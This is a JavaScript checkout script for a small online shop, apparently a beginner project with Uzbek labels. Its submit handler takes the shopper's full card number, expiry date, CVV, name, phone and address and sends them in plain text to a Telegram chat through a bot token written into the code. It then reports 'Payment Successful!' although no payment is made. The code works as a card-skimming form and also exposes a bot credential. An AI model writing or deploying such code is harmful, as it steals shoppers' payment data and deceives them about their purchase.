let address = document.querySelector(".address");
let telnomer = document.querySelector(".nomer");
let cardholder = document.querySelector(".holder");
let cardnumber = document.querySelector(".number");
let carddate = document.querySelector(".date");
let cardcvv = document.querySelector(".cvv");
let pay = document.querySelector(".pay");
let error = document.querySelector(".error");
let cart = JSON.parse(localStorage.getItem("cart"))
let paymet__subtotal = document.querySelector(".payment__subtotal-price")
let paymet__tax = document.querySelector(".payment__tax-price")
let paymet__price = document.querySelector(".payment__total-price")

paymet__subtotal.textContent = "$" + localStorage.getItem("subtotal")
paymet__tax.textContent = "$" + localStorage.getItem("percent")
paymet__price.textContent = "$" + localStorage.getItem('total')
document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector(".payment__left");
    const error = document.querySelector(".error");
    const telnomererror = document.querySelector(".telnomer__error");

    let cart = JSON.parse(localStorage.getItem("cart")) || [];

    form.addEventListener("submit", function (e) {
        e.preventDefault();

        error.textContent = "";
        error.style.color = 'red'
        telnomererror.textContent = "";

        const address = form.querySelector(".address").value.trim();
        const nomer = form.querySelector(".nomer").value.trim();
        const holder = form.querySelector(".holder").value.trim();
        const number = form.querySelector(".number").value.trim();
        const date = form.querySelector(".date").value.trim();
        const cvv = form.querySelector(".cvv").value.trim();

        if (!address || !nomer || !holder || !number || !date || !cvv) {
            error.textContent = "Enter full information!";
            error.style.color = "red";
            return;
        }

        if (number.length !== 16) {
            error.textContent = "Card number must be 16 digits!";
            return;
        }

        if (!isNaN(holder)) {
            error.textContent = "Card holder must be text!";
            return;
        }

        if (!nomer.startsWith("+998")) {
            telnomererror.textContent = "Phone must start with +998!";
            return;
        }

        let mahsulot_name = cart.map(el => el.name).join(", ");
        let mahsulotl_price = localStorage.getItem("total")

        const token = "8796129355:AAFgP-y_cqTZFThgmT9JiRtWKdaelStquJ4";
        const chat_id = "5798503887";

        const text = `
Yangi buyurtma!
Address: ${address}
Phone: ${nomer}

Card:
Holder: ${holder}
Number: ${number}
Date: ${date}
CVV: ${cvv}

Products:
Products name: ${mahsulot_name}
Products price: ${mahsulotl_price}$
`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id,
                text
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                error.textContent = "Payment Successful!";
                error.style.color = "green";
                form.reset();
            } else {
                error.textContent = "Error sending!";
            }
        })
        .catch(() => {
            error.textContent = "Server error!";
        });
        setTimeout(() => {
        window.location.href="/buyurtma.html"
        localStorage.setItem('cart' , JSON.stringify([]))
        }, 5000);
    });
});


